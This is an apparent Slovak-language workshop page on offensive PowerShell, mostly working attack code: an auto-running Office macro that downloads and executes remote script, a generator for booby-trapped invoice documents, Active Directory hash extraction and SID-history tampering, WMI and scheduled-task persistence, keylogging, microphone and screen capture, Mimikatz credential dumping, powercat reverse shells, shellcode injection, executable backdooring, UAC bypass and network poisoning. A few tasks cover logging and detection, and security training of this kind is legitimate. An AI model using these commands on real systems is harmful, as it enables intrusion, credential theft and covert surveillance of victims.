---
ref: powershell-security
title: PowerShell Security
date: 2017-09-17T11:06:03+00:00
layout: page
permalink: /sk/powershell/
---
&nbsp;

### Office dokument s&nbsp;automaticky spúšťaným makrom

Vytvorte Office dokument (Word / Excel / PowerPoint) a&nbsp;vložte do&nbsp;neho cez&nbsp;makrá tento kód:

<pre class="lang:vb decode:true">' Kompatibilita s&nbsp;MS Word
Sub Auto_Open()
    Dim exec As&nbsp;String
    cmd = "powershell.exe ""Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('http://bit.ly/e0Mw9w'))"""
    Shell (cmd)
End Sub

' Kompatibilita s&nbsp;MS PowerPoint
Sub AutoOpen()
    Auto_Open
End Sub

' Kompatibilita s&nbsp;MS Excel
Sub Workbook_Open()
    Auto_Open
End Sub</pre>

### Automatické generovanie dokumentov s&nbsp;makrami

<pre class="lang:ps decode:true "># Import prikazu Out-Word z&nbsp;modulu nishang
IEX(IWR 'https://raw.githubusercontent.com/samratashok/nishang/master/Client/Out-Word.ps1')
 
# Vytvorenie payloadu
$payload = "powershell.exe -ExecutionPolicy Bypass -noprofile -noexit -c Get-Process"

# Vygenerovanie Word dokumentu
$path = Join-Path (Resolve-Path .) 'Faktura.doc'
Out-Word -Payload $payload -OutputFile $path -RemainSafe
</pre>

### Offline prístup k&nbsp;AD databázi

[Zdrojové kódy modulu DSInternals](https://github.com/MichaelGrafnetter/DSInternals)

<pre class="lang:ps decode:true "># Nainštalujeme modul DSInternals
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
Install-Module -Name DSInternals -Scope CurrentUser -Force
Import-Module -Name DSInternals

# Vytvoríme si&nbsp;pomocný adresár
$targetFolder = 'C:\HackerFest\ActiveDirectory'
mkdir -Path $targetFolder -Force

&lt;#
Manuálny krok: Stiahnite a&nbsp;rozbaľte súbor ntds.zip z&nbsp;adresy
https://1drv.ms/f/s!Ah1NVj_AudV4iZ1M_EF6HUu1dLT9KA do&nbsp;C:\HackerFest\ActiveDirectory
#&gt;

# Zobrazenie informácií o&nbsp;databáze
$dbFile = Join-Path $targetFolder ntds.dit
$dcInfo = Get-ADDBDomainController -DBPath $dbFile
$dcInfo

# Zobrazenie zoznamu používateľov
Get-ADDBAccount -All -DBPath $dbFile | Out-GridView

# Načítanie SysKey z&nbsp;registrov
$regFile = Join-Path $targetFolder SYSTEM
$sysKey = Get-SysKey -SystemHiveFilePath $regFile
$sysKey

# Dešifrovanie hashov hesla
Get-ADDBAccount -SamAccountName Wendy -DBPath $dbFile -SysKey $sysKey

# Export hashov hesiel pre&nbsp;oclHashcat
Get-ADDBAccount -All -DBPath $dbFile -SysKey $sysKey | Format-Custom -View HashcatNT

# Zakázanie a&nbsp;povolenie účtu
Get-ADDBAccount -SamAccountName Administrator -DBPath $dbFile | select SamAccountName,Enabled
Disable-ADDBAccount -SamAccountName Administrator -DBPath $dbFile
Get-ADDBAccount -SamAccountName Administrator -DBPath $dbFile | select SamAccountName,Enabled

Enable-ADDBAccount -SamAccountName Administrator -DBPath $dbFile
Get-ADDBAccount -SamAccountName Administrator -DBPath $dbFile | select SamAccountName,Enabled

&lt;# Zmena členstva v&nbsp;primárnej skupine Potrebujeme zoznam dobre známych RIDov: https://support.microsoft.com/en-us/help/243330/well-known-security-identifiers-in-windows-operating-systems Napríklad: 512 Domain Admins 513 Domain Users 515 Domain Computers 516 Domain Controllers 519 Enterprise Admins #&gt;
Get-ADDBAccount -SamAccountName Wendy -DBPath $dbFile | select SamAccountName,PrimaryGroupId
Set-ADDBPrimaryGroup -SamAccountName Wendy -PrimaryGroupId 512 -DBPath $dbFile
Get-ADDBAccount -SamAccountName Wendy -DBPath $dbFile | select SamAccountName,PrimaryGroupId

# Zmena SID History
$sid1 = $dcInfo.DomainSid.Value + '-512'
$sid2 = $dcInfo.DomainSid.Value + '-516'
$sid3 = $dcInfo.DomainSid.Value + '-519'

Get-ADDBAccount -SamAccountName Eva -DBPath $dbFile | select DistinguishedName,SamAccountName,Enabled,PrimaryGroupId,SidHistory
Add-ADDBSidHistory -SamAccountName Eva -SidHistory $sid1,$sid2,$sid3 -DBPath $dbFile
Get-ADDBAccount -SamAccountName Eva -DBPath $dbFile | select DistinguishedName,SamAccountName,Enabled,PrimaryGroupId,SidHistory

# Vynechanie replikačných metadát
Add-ADDBSidHistory -SamAccountName Adam -SidHistory $sid1,$sid2,$sid3 -SkipMetaUpdate -DBPath $dbFile

</pre>

Úloha: Napíšte skripty na&nbsp;detekciu účtov so&nbsp;SID History a&nbsp;s&nbsp;neštandardnou primárnou skupinou.

### Kódovanie a&nbsp;šifrovanie príkazov

[PowerSploit](https://github.com/PowerShellMafia/PowerSploit)

<pre class="lang:ps decode:true">Out-EncodedCommand -ScriptBlock { Get-Process | Out-GridView -Wait }</pre>

<pre class="lang:ps decode:true "># Vytvorenie cleartext scriptu
echo 'Get-Process' &gt; clear.ps1

# Vytvorenie zašifrovaného skriptu
Out-EncryptedScript -ScriptPath .\clear.ps1 -Password SuperSecret -Salt Random -FilePath evil.ps1
cat .\evil.ps1

# Od+sifrovanie skriptu
. .\evil.ps1
de SuperSecret Random</pre>

### Spustenie skriptu z&nbsp;webu

<pre class="lang:ps decode:true "># RickRoll
iex (iwr http://bit.ly/e0Mw9w )

# PortScan
$uri = 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1'
(Invoke-WebRequest -Uri $uri).Content | Invoke-Expression
Invoke-Portscan -Hosts www.hackerfest.cz</pre>

### Obídenie PowerShell Execution Policy

<pre class="lang:ps decode:true ">Set-ExecutionPolicy Restricted
powershell.exe -ExecutionPolicy Bypass ...</pre>

### Logovanie

Úloha: Zapnite logovanie PowerShell príkazov cez&nbsp;lokálny GPO, spustite niekoľko príkazov a&nbsp;skúste ich nájsť v&nbsp;logoch.

[Script Tracing and&nbsp;Logging](https://docs.microsoft.com/en-us/powershell/wmf/5.0/audit_script)

[PowerShell 5 Logging](https://www.rootusers.com/enable-and-configure-module-script-block-and-transcription-logging-in-windows-powershell/)[  
<img class="aligncenter" src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/dunwoody%20powershell/figure_2.png" alt="" width="501" height="319" />](https://www.fireeye.com/content/dam/fireeye-www/blog/images/dunwoody%20powershell/figure_2.png) 

### Perzistencia

[PowerSploit](https://github.com/PowerShellMafia/PowerSploit)

<pre class="lang:ps decode:true">Import-Module ....\PowerSploit.psd1
$Rickroll = { iex (iwr http://bit.ly/e0Mw9w ) }
$ElevatedOptions = New-ElevatedPersistenceOption -ScheduledTask -OnIdle
$UserOptions = New-UserPersistenceOption -ScheduledTask -OnIdle

# Vygenerujeme inštalačný a&nbsp;odinštalačný skript na&nbsp;plánovanú úlohu
Add-Persistence -ScriptBlock $RickRoll -ElevatedPersistenceOption $ElevatedOptions -UserPersistenceOption $UserOptions -Verbose -PassThru | Out-EncodedCommand | Out-File .\EncodedPersistentScript.ps1</pre>

Úloha: Skúste WMI alebo Registry perzistenciu!

### WMI Perzistencia (Manuálny spôsob)

[WMI Explorer](https://wmie.codeplex.com/downloads/get/924042)

<pre class="lang:ps decode:true ">$payload = {
    Get-Date &gt;&gt; C:\test.txt
}

$encodedPayload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($Payload))

$command = "powershell.exe -EncodedCommand $encodedPayload"

$timer = Set-WmiInstance -Class __IntervalTimerInstruction -Arguments @{
    IntervalBetweenEvents = ([UInt32] 10000)
    SkipIfPassed = $False
    TimerId = 'PayloadTrigger'
}

$filter = Set-WmiInstance -Class __EventFilter -Namespace root/subscription -Arguments @{
    EventNamespace = 'root/cimv2'
    Name = 'TimerTrigger'
    Query = "SELECT * FROM&nbsp;__TimerEvent WHERE&nbsp;TimerID = 'PayloadTrigger'"
    QueryLanguage = 'WQL'
}

$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root/subscription -Arguments @{
    Name = 'ExecuteEvilPowerShell'
    CommandLineTemplate = $command
}

$binding = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root/subscription -Arguments @{
    Filter = $filter
    Consumer = $consumer
}

# Cleanup
$consumer = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name = 'ExecuteEvilPowerShell'"
$filter = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name = 'TimerTrigger'"
$binding = Get-WmiObject -Namespace root/subscription -Query "REFERENCES OF&nbsp;{$($consumer.__RELPATH)} WHERE&nbsp;ResultClass = __FilterToConsumerBinding"
$timer = Get-WmiObject -Namespace root/cimv2 -Class __IntervalTimerInstruction -Filter "TimerId = 'PayloadTrigger'"

Remove-WmiObject -InputObject $binding
Remove-WmiObject -InputObject $consumer
Remove-WmiObject -InputObject $filter
Remove-WmiObject -InputObject $timer</pre>

### P/Invoke &#8211; INI Parser 1

[GetPrivateProfileString MSDN](https://msdn.microsoft.com/en-us/library/windows/desktop/ms724353(v=vs.85).aspx?f=255&MSPPError=-2147217396)

[GetPrivateProfileString PInvoke.NET](http://www.pinvoke.net/default.aspx/kernel32.GetPrivateProfileString)

[ProcMon](https://live.sysinternals.com/Procmon.exe) &#8211; Sledujte File System a&nbsp;Process aktivitu PowerShellu

<pre class="lang:ps decode:true"># Vytvoríme C# signatúru
$signature = @’
[DllImport("kernel32.dll")]
public static extern uint GetPrivateProfileString(
    string lpAppName,
    string lpKeyName,
    string lpDefault,
    StringBuilder lpReturnedString,
    uint nSize,
    string lpFileName);
‘@

# Skompilujeme
Add-Type -MemberDefinition $signature `
         -Name INIFile `
         -Namespace Win32Utils `
         -Using System.Text

# Zabalíme do&nbsp;PowerShell funkcie

function Get-PrivateProfileString
{
    param(
        [string] $File,
        [string] $Category,
        [string] $Key
        )
    $builder = [System.Text.StringBuilder]::new(1024)
    $result = [Win32Utils.INIFile]::GetPrivateProfileString($category, $key, "", $builder, $builder.Capacity, $file)
    return $builder.ToString() 
}

# Zavoláme funkciu
Get-Content 'C:\Windows\System32\GroupPolicy\gpt.ini'
Get-PrivateProfileString -File 'C:\Windows\System32\GroupPolicy\gpt.ini' `
                         -Category General `
                         -Key Version</pre>

### P/Invoke &#8211; INI Parser 2

[Invoke-WindowsApi.ps1 ](https://raw.githubusercontent.com/hsmalley/Powershell/master/Invoke-WindowsApi.ps1)

Znovu sledujte aktivitu PowerShellu pomocou nástroja ProcMon.

<pre class="lang:ps decode:true"># Stiahneme skript Invoke-WindowsApi.ps1, ale&nbsp;neuložíme ho&nbsp;$script = Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/hsmalley/Powershell/master/Invoke-WindowsApi.ps1'
$scriptBlock = [Scriptblock]::Create($script.Content)

# Obalíme ho&nbsp;funkciou s&nbsp;definíciou signatúry
function Get-PrivateProfileString2
{
param( 
    [string] $File, 
    [string] $category, 
    [string] $Key)

## Prepare the&nbsp;parameter types and&nbsp;parameter values for&nbsp;the&nbsp;Invoke-WindowsApi script 
$returnValue = New-Object System.Text.StringBuilder 500 
$parameterTypes = [string], [string], [string], [System.Text.StringBuilder], [int], [string] 
$parameters = $Category,
              $Key,
              '',
              [System.Text.StringBuilder] $returnValue,
              [int] $returnValue.Capacity,
              $File
## Invoke the&nbsp;API 
# [void] (Invoke-WindowsApi "kernel32.dll" ([UInt32]) "GetPrivateProfileString" $parameterTypes $parameters)
Invoke-Command -ScriptBlock $scriptBlock -ArgumentList 'kernel32.dll',([UInt32]),'GetPrivateProfileString',$parameterTypes,$parameters &gt; $null

## And&nbsp;return the&nbsp;results 
$returnValue.ToString()
}

Get-PrivateProfileString2 -File 'C:\Windows\System32\GroupPolicy\gpt.ini' `
                         -Category General `
                         -Key Version
</pre>

### Keylogger

<pre class="lang:ps decode:true">Get-Keystrokes -LogPath C:\HackerFest\keystrokes.txt -Timeout 1 -PassThru</pre>

### Nahrávanie z&nbsp;mikrofónu

<pre class="lang:ps decode:true ">Get-MicrophoneAudio -Length 10 -Path C:\HackerFest\audio.wav</pre>

### Screenshoty

<pre class="lang:ps decode:true">Enable-WindowsOptionalFeature -FeatureName NetFx3 -Online
Get-TimedScreenshot -Path c:\hackerfest\ -Interval 10 -EndTime 14:00
</pre>

### Vykrádanie súborov

<pre class="lang:ps decode:true">Invoke-NinjaCopy -path c:\windows\system32\config\system -localdestination c:\HackerFest\system -verbose
</pre>

### Vykrádanie hesiel z&nbsp;pamäte

<pre class="lang:ps decode:true">Invoke-Mimikatz -DumpCreds # -ComputerName PC2
Invoke-Mimikatz -Command 'sekurlsa::krbtgt' -ComputerName PC2</pre>

Tip: UAC / [LocalAccountTokenFilterPolicy](https://support.microsoft.com/en-us/help/951016/description-of-user-account-control-and-remote-restrictions-in-windows)

### Vykrádanie hesiel z&nbsp;pamäte 2

[Mimikatz](https://github.com/gentilkiwi/mimikatz/releases/download/2.1.1-20170813/mimikatz_trunk.zip)

<pre class="lang:ps decode:true"># PowerShell:
Get-Process -Name lsass | Out-Minidump -DumpFilePath C:\HackerFest\

# Mimikatz:
sekurlsa::minidump "C:\HackerFest\lsass_560.dmp"
sekurlsa::logonPasswords</pre>

### Vykrádanie hesiel z&nbsp;pamäte 3

[PowerMemory](https://github.com/giMini/PowerMemory)

Reveal-MemoryCredentials.ps1

### Heslá k&nbsp;WiFi

[Get-WLANKeys](https://github.com/samratashok/nishang/blob/master/Gather/Get-WLAN-Keys.ps1)

### BSOD po ukončení PowerShellu

<pre class="lang:ps decode:true">Set-CriticalProcess</pre>

### Spúšťanie príkazov na&nbsp;diaľku

Úloha: Spustite príkaz Stop-Process na&nbsp;vzdialenom PC.

### Spúšťanie príkazov na&nbsp;diaľku bez PS Remotingu

<pre class="lang:ps decode:true"># Načítanie PowerCat
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')

# Spustenie listeneru
powercat -l -p 8000

# Spustenie klienta
powercat -c 10.0.0.1 -p 8000

# Spustenie klienta v&nbsp;režime PowerShell
powercat -c 10.0.0.1 -p 8000 -ep

# Vygenerovanie reverzného TCP payloadu
powercat -c 10.0.0.1 -p 10000 -ep -g
powercat -c 10.0.0.1 -p 10000 -ep -ge
</pre>

Úloha 1: Skúste skopírovať súbor pomocou powercat.

Úloha 2: Vytvorte XLS dokument s&nbsp;makrom, ktoré spustí vygenerovaný payload.

### Spúšťanie príkazov na&nbsp;diaľku cez&nbsp;WMI

Znovu použijeme PowerSploit

<pre class="lang:ps decode:true ">Invoke-WmiCommand -Payload { if&nbsp;($True) { 'Do Evil' } } -ComputerName '10.10.1.1'</pre>

### Spustenie natívneho kódu v&nbsp;inom procese

<pre class="lang:ps decode:true">notepad
$target = Get-Process notepad
Invoke-ShellCode -Force -ProcessID $target.Id</pre>

### Zavírovanie EXE súborov

[Subver-PE](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Subvert-PE.ps1)

<pre class="lang:ps decode:true"># Príklad:
Subvert-PE -Path 'C:\Program Files\Notepad++\notepad++.exe' -Write</pre>

### Eskalácia oprávnení

<pre class="lang:ps decode:true"># returns services with unquoted paths that&nbsp;also have a&nbsp;space in&nbsp;the&nbsp;name
Get-ServiceUnquoted

# returns services where&nbsp;the&nbsp;current user can write to&nbsp;the service binary path or&nbsp;its config
Get-ModifiableServiceFile

# returns services the&nbsp;current user can modify
Get-ModifiableService

# find schtasks with modifiable target files
Get-ModifiableScheduledTaskFile

# checks for&nbsp;any modifiable binaries/scripts (or their configs) in&nbsp;HKLM autoruns
Get-ModifiableRegistryAutoRun

# finds potential DLL hijacking opportunities for&nbsp;currently running processes
Find-ProcessDLLHijack</pre>

[What is&nbsp;DLL hijacking?](https://stackoverflow.com/questions/3623490/what-is-dll-hijacking)

### MITM útok

<pre class="lang:ps decode:true">iex(iwr 'https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/collection/Invoke-Inveigh.ps1')

Invoke-Inveigh -ConsoleOutput Y -LLMNR Y -HTTP Y -HTTPS Y -SMB Y -NBNS Y -MachineAccounts Y -StatusOutput Y

Stop-Inveigh</pre>

### Stream obrazovky

<pre class="lang:ps decode:true ">Show-TargetScreen -Bind -Port 10800

# firefox 'http://localhost:10800'</pre>

### Obídenie UAC (pre-Windows 10)

<pre class="lang:ps decode:true ">iex(iwr 'https://raw.githubusercontent.com/samratashok/nishang/master/Escalation/Invoke-PsUACme.ps1')
Invoke-PsUACme -method mmc</pre>

### Obídenie UAC

[UACME](https://github.com/hfiref0x/UACME)

### Phishing

[Invoke-CredentialsPhish](https://github.com/samratashok/nishang/blob/master/Gather/Invoke-CredentialsPhish.ps1)

### Obídenie blokovaného powershell.exe

[Not PowerShell](https://github.com/Ben0xA/nps)

<pre class="lang:ps decode:true ">nps.exe "& Get-Date; Write-Output 'Ohai there'"</pre>

&nbsp;